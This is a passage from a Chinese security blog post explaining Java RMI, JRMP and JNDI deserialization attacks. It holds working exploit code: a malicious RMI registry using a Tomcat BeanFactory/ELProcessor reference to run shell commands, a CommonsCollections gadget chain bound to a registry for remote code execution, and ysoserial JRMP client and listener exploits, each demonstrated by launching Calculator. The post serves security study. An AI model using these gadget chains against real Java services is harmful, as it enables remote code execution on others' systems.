<p>PS：使用这种方式，需要lookup的客户端存在以下依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;8.5.15&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class App</span><br><span class="line">&#123;</span><br><span class="line">    public static void main( String[] args )</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">            ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;,null,&quot;&quot;,&quot;&quot;,true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">            //redefine a setter name for the &apos;x&apos; property from &apos;setX&apos; to &apos;eval&apos;, see BeanFactory.getObjectInstance code</span><br><span class="line">            resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">            //expression language to execute &apos;nslookup jndi.s.artsploit.com&apos;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">            resourceRef.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&apos;(java.lang.String[])&apos;]([&apos;/bin/sh&apos;,&apos;-c&apos;,&apos;/Applications/Calculator.app/Contents/MacOS/Calculator&apos;]).start()\&quot;)&quot;));</span><br><span class="line"></span><br><span class="line">            ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);</span><br><span class="line">            registry.bind(&quot;hello&quot;,referenceWrapper);</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-2-为什么Registry-bind暴露一个服务对象到RmiRegistry会导致Registry服务自身被反序列化RCE"><a href="#2-2-为什么Registry-bind暴露一个服务对象到RmiRegistry会导致Registry服务自身被反序列化RCE" class="headerlink" title="2.2 为什么Registry bind暴露一个服务对象到RmiRegistry会导致Registry服务自身被反序列化RCE"></a>2.2 为什么Registry bind暴露一个服务对象到RmiRegistry会导致Registry服务自身被反序列化RCE</h4><p>我们先看一个例子：</p>
<ul>
<li>程序A</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      LocateRegistry.createRegistry(1099);</span><br><span class="line">    &#125; catch (RemoteException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    while(true);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序A创建了一个1099端口的Registry注册中心</p>
<ul>
<li>程序B</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class App3 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformer = new ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map ouputMap = LazyMap.decorate(innerMap,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(ouputMap,&quot;pwn&quot;);</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line">        try &#123;</span><br><span class="line">            Field field = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            Map tmpMap = new HashMap();</span><br><span class="line">            tmpMap.put(&quot;pwn&quot;,badAttributeValueExpException);</span><br><span class="line">            Constructor&lt;?&gt; ctor = null;</span><br><span class="line">            ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            ctor.setAccessible(true);</span><br><span class="line">            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class,tmpMap);</span><br><span class="line"></span><br><span class="line">            Remote remote = Remote.class.cast(Proxy.newProxyInstance(App3.class.getClassLoader(), new Class[] &#123;Remote.class&#125;, invocationHandler));</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br><span class="line">            registry.bind(&quot;pwn&quot;,remote);</span><br><span class="line">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>熟悉ysoserial的小伙伴会发现，这其实就是一个ysoserial中的一个payload，而当我启动这个程序，并把这个payload对象动态代理成Remote，并注册到Registry注册中心后，注册中心就会被RCE弹出计算器。</p>
<p>为什么会导致这样呢？其实我们不难猜测，既然触发了RCE，那么必然Registry注册中心执行了这段代码，而这段代码怎么从程序B到程序A的呢，这其中必然是registry.bind(“pwn”,remote)这个方法中的细节，而java对于对象数据的传输，一向都是通过java原生序列化的方式进行，我们可以尝试抓包看看。<br><img src="https://threedr3am.oss-cn-hangzhou.aliyuncs.com/%E5%85%88%E7%9F%A5/2351578379904_.pic_hd.jpg" alt="WireShark抓包数据"></p>
<p>可以清晰的看到，程序B发送了序列化的数据流给程序A，这印证了我前面的猜测。</p>
<h4 id="2-3-为什么使用JRMP能互相对打"><a href="#2-3-为什么使用JRMP能互相对打" class="headerlink" title="2.3 为什么使用JRMP能互相对打"></a>2.3 为什么使用JRMP能互相对打</h4><p>在说使用JRMP为什么能互相对打前，我们回顾一下前面第一章写的JRMP的概念“JRMP是一个协议，是用于Java RMI过程中的协议，只有使用这个协议，方法调用双方才能正常的进行数据交流。”，很明显JRMP是一种协议，它规定了数据是以什么格式、什么形式在RMI的过程进行传输。那就不难理解为什么使用JRMP能互相对打了。</p>
<p>如果说，JRMP协议规定了RMI的时候，传输的数据包含有java原生序列化数据，并且在JRMP的客户端还是服务端，当接收到JRMP协议数据时，都会把序列化的数据进行反序列化的话，那么就不难解析了。</p>
<p>那我们再以一个例子，来讲述如何用JRMP协议使用客户端去打服务端：</p>
<ul>
<li>服务端</li>
</ul>
<p>我这里使用了ysoserial的payload直接创建一个JRMP的服务端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@PayloadTest( skip = &quot;This test would make you potentially vulnerable&quot;)</span><br><span class="line">@Authors(&#123; Authors.MBECHLER &#125;)</span><br><span class="line">public class JRMPListener extends PayloadRunner implements ObjectPayload&lt;UnicastRemoteObject&gt; &#123;</span><br><span class="line"></span><br><span class="line">    public UnicastRemoteObject getObject ( final String command ) throws Exception &#123;</span><br><span class="line">        int jrmpPort = Integer.parseInt(command);</span><br><span class="line">        UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[] &#123;</span><br><span class="line">            RemoteRef.class</span><br><span class="line">        &#125;, new Object[] &#123;</span><br><span class="line">            new UnicastServerRef(jrmpPort)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Reflections.getField(UnicastRemoteObject.class, &quot;port&quot;).set(uro, jrmpPort);</span><br><span class="line">        return uro;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main ( final String[] args ) throws Exception &#123;</span><br><span class="line">        PayloadRunner.runDeserialize = true;</span><br><span class="line">        PayloadRunner.run(JRMPListener.class, new String[] &#123;&quot;8889&quot;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>客户端</li>
</ul>
<p>接着看ysoserial的exploit目录ysoserial/src/main/java/ysoserial/exploit</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br><span class="line">├─JBoss.java</span><br><span class="line">├─JMXInvokeMBean.java</span><br><span class="line">├─JRMPClassLoadingListener.java</span><br><span class="line">├─JRMPClient.java</span><br><span class="line">├─JRMPListener.java</span><br><span class="line">├─JSF.java</span><br><span class="line">├─JenkinsCLI.java</span><br><span class="line">├─JenkinsListener.java</span><br><span class="line">├─JenkinsReverse.java</span><br><span class="line">├─RMIRegistryExploit.java</span><br><span class="line">└RMIRegistryExploit2.java</span><br></pre></td></tr></table></figure>
<p>其中，我们可以利用JRMPClient.java这个exploit去实现打服务端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class JRMPClient &#123;</span><br><span class="line"></span><br><span class="line">    public static final void main ( final String[] argsx ) &#123;</span><br><span class="line">        String[] args = new String[] &#123;&quot;127.0.0.1&quot;,&quot;8889&quot;,&quot;CommonsCollections6&quot;,&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;&#125;;</span><br><span class="line">        if ( args.length &lt; 4 ) &#123;</span><br><span class="line">            System.err.println(JRMPClient.class.getName() + &quot; &lt;host&gt; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;);</span><br><span class="line">            System.exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object payloadObject = Utils.makePayloadObject(args[2], args[3]);</span><br><span class="line">        String hostname = args[ 0 ];</span><br><span class="line">        int port = Integer.parseInt(args[ 1 ]);</span><br><span class="line">        try &#123;</span><br><span class="line">            System.err.println(String.format(&quot;* Opening JRMP socket %s:%d&quot;, hostname, port));</span><br><span class="line">            makeDGCCall(hostname, port, payloadObject);</span><br><span class="line">        &#125;</span><br><span class="line">        catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace(System.err);</span><br><span class="line">        &#125;</span><br><span class="line">        Utils.releasePayload(args[2], payloadObject);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们指定了当通过客户端使用JRMP协议去连接服务端时，使用CommonsCollections6这个payload（反序列化gadget chain），去RCE。</p>
<p>PS：在jdku121开始，部分class会被过滤，导致大部分payload不能被反序列化，报错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一月 07, 2020 4:20:06 下午 java.io.ObjectInputStream filterCheck</span><br><span class="line">信息: ObjectInputFilter REJECTED: class java.util.HashSet, array length: -1, nRefs: 2, depth: 1, bytes: 75, ex: n/a</span><br></pre></td></tr></table></figure>
<p>具体怎么绕过，网上看着挺多文章分析的。</p>
<p>接着我们再以一个例子，来讲述如何用JRMP协议使用服务端去打客户端：</p>
<ul>
<li>服务端</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br><span class="line">├─JBoss.java</span><br><span class="line">├─JMXInvokeMBean.java</span><br><span class="line">├─JRMPClassLoadingListener.java</span><br><span class="line">├─JRMPClient.java</span><br><span class="line">├─JRMPListener.java</span><br><span class="line">├─JSF.java</span><br><span class="line">├─JenkinsCLI.java</span><br><span class="line">├─JenkinsListener.java</span><br><span class="line">├─JenkinsReverse.java</span><br><span class="line">├─RMIRegistryExploit.java</span><br><span class="line">└RMIRegistryExploit2.java</span><br></pre></td></tr></table></figure>
<p>我们这里的例子，使用的是ysoserial的JRMPListener.java，并监听9999端口的JRMP连接，当有客户端连上后，会以JRMP的协议格式，把CommonsCollections6的payload发给对方。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public static final void main ( String[] args ) &#123;</span><br><span class="line">    args = new String[] &#123;&quot;9999&quot;, &quot;CommonsCollections6&quot;, &quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;&#125;;</span><br><span class="line">    if ( args.length &lt; 3 ) &#123;</span><br><span class="line">        System.err.println(JRMPListener.class.getName() + &quot; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;);</span><br><span class="line">        System.exit(-1);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    final Object payloadObject = Utils.makePayloadObject(args[ 1 ], args[ 2 ]);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        int port = Integer.parseInt(args[ 0 ]);</span><br><span class="line">        System.err.println(&quot;* Opening JRMP listener on &quot; + port);</span><br><span class="line">        JRMPListener c = new JRMPListener(port, payloadObject);</span><br><span class="line">        c.run();</span><br><span class="line">    &#125;</span><br><span class="line">    catch ( Exception e ) &#123;</span><br><span class="line">        System.err.println(&quot;Listener error&quot;);</span><br><span class="line">        e.printStackTrace(System.err);</span><br><span class="line">    &#125;</span><br><span class="line">    Utils.releasePayload(args[1], payloadObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>客户端</li>
</ul>
<p>我这里使用了ysoserial的payload直接创建一个JRMP的客户端，连接127.0.0.1的9999端口</p>
<p>ysoserial.payloads.JRMPClient：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public static final void main ( String[] args ) &#123;</span><br><span class="line">    args = new String[] &#123;&quot;9999&quot;, &quot;CommonsCollections6&quot;, &quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;&#125;;</span><br><span class="line">    if ( args.length &lt; 3 ) &#123;</span><br><span class="line">        System.err.println(JRMPListener.class.getName() + &quot; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;);</span><br><span class="line">        System.exit(-1);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    final Object payloadObject = Utils.makePayloadObject(args[ 1 ], args[ 2 ]);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        int port = Integer.parseInt(args[ 0 ]);</span><br><span class="line">        System.err.println(&quot;* Opening JRMP listener on &quot; + port);</span><br><span class="line">        JRMPListener c = new JRMPListener(port, payloadObject);</span><br><span class="line">        c.run();</span><br><span class="line">    &#125;</span><br><span class="line">    catch ( Exception e ) &#123;</span><br><span class="line">        System.err.println(&quot;Listener error&quot;);</span><br><span class="line">        e.printStackTrace(System.err);</span><br><span class="line">    &#125;</span><br><span class="line">    Utils.releasePayload(args[1], payloadObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后，就能看的计算器弹出来了，顺利RCE。</p>
<h3 id="3-打法总结"><a href="#3-打法总结" class="headerlink" title="3 打法总结"></a>3 打法总结</h3><ol>
<li>打Registry注册中心</li>
</ol>
<p>通过使用Registry连接到注册中心，然后把gadget chain对象bind注册到注册中心，从而引起注册中心反序列化RCE</p>
<ol start="2">
<li>打InitialContext.lookup执行者</li>
</ol>
<p>通过使用JNDI的实现，也就是rmi或ldap的目录系统服务，在其中放置一个某名称关联的Reference，Reference关联http服务中的恶意class，在某程序InitialContext.lookup目录系统服务后，返回Reference给该程序，使其加载远程class，从而RCE</p>
<ol start="3">
<li>JRMP协议客户端打服务端</li>
</ol>
<p>使用JRMP协议，直接发送gadget chain的序列化数据到服务端，从而引起服务端反序列化RCE</p>
<ol start="4">
<li>JRMP协议服务端打客户端</li>
</ol>
<p>使用JRMP协议，当客户端连上后，直接返回gadget chain的序列化数据给客户端，从而引起客户端反序列化RCE</p>
<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://zh.m.wikipedia.org/wiki/Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8" target="_blank" rel="noopener">https://zh.m.wikipedia.org/wiki/Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8</a></p>
<p><a href="https://zh.m.wikipedia.org/wiki/Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">https://zh.m.wikipedia.org/wiki/Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E5%8D%8F%E8%AE%AE</a></p>
<p><a href="https://zh.m.wikipedia.org/wiki/JNDI" target="_blank" rel="noopener">https://zh.m.wikipedia.org/wiki/JNDI</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Java反序列化/" rel="tag"># Java反序列化</a>
          
            <a href="/tags/RMI、JRMP、JNDI/" rel="tag"># RMI、JRMP、JNDI</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/01/13/改造gadgetinspector篇-自动化挖掘Fastjson gadget chain/" rel="next" title="改造gadgetinspector篇-自动化挖掘Fastjson gadget chain">
                <i class="fa fa-chevron-left"></i> 改造gadgetinspector篇-自动化挖掘Fastjson gadget chain
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/01/29/Fastjson反序列化RCE核心-四个关键点分析/" rel="prev" title="Fastjson反序列化RCE核心-四个关键点分析">
                Fastjson反序列化RCE核心-四个关键点分析 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/avator/duolaAmeng.jpg" alt="threedr3am">
            
              <p class="site-author-name" itemprop="name">threedr3am</p>
              <p class="site-description motion-element" itemprop="description">菜到如此</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">18</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/threedr3am" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://rui0.cn/" title="ruilin" target="_blank">ruilin</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.leadroyal.cn/" title="leadroyal(卓卓师傅)" target="_blank">leadroyal(卓卓师傅)</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.kingkk.com/" title="kingkk" target="_blank">kingkk</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://driverxdw.github.io/" title="in0va'S(dw大鸽)" target="_blank">in0va'S(dw大鸽)</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://gengzongyuan.github.io/" title="大树先生(测试大牛)" target="_blank">大树先生(测试大牛)</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://chensem.github.io/" title="chensem(逆向龙哥)" target="_blank">chensem(逆向龙哥)</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://meizjm3i.github.io/" title="梅子酒" target="_blank">梅子酒</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.orange.tw/" title="orange" target="_blank">orange</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0-前言"><span class="nav-number">1.</span> <span class="nav-text">0 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-搞懂概念"><span class="nav-number">2.</span> <span class="nav-text">1 搞懂概念</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-RMI"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 RMI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-JRMP"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 JRMP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-JNDI"><span class="nav-number">2.3.</span> <span class="nav-text">1.3 JNDI</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-以攻击例子来阐述"><span class="nav-number">3.</span> <span class="nav-text">2 以攻击例子来阐述</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-为什么用InitialContext-lookup一个JNDI的rmi、ldap服务会导致自身被反序列化RCE"><span 